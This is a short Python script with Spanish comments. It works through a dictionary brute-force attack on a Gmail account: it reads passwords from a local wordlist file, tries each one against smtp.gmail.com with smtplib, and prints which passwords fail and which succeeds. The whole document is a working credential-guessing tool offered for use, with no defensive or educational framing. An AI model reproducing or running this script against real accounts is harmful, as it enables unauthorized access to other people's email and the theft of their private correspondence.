import smtplib
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()
print("\n")
email = input("Email: ")
#Crear Directorio o Diccionario
#Especificar Ruta dentro de Carpeta
dic = open("./johan.txt", "r")
for pwd in dic:
   try:
    smtpserver.login(email, pwd)
    print("Contraseña Correcta: %s"  % pwd)
    break;
   except smtplib.SMTPAuthenticationError:
    print ("Contraseña Incorrecta: %s" % pwd)